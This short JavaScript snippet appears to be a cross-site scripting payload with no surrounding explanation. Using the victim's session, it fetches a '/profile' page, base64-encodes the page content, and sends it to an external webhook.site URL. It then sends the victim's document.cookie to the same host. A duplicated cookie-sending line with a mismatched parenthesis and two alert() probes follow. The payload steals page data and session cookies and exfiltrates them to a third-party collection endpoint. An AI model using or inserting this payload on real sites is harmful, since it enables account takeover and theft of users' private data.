fetch('/profile?linemode=1',{credentials:'include'})
 .then(r=>r.text())
 .then(t=>fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?f='+btoa(t)))
 .then(()=>fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?c='+btoa(document.cookie)));
fetch('https://webhook.site/66770cdf-b9f9-4513-86f4-af1b4c2fa35c?c='+btoa(document.cookie)));
alert(123);
alert(document.cookie);
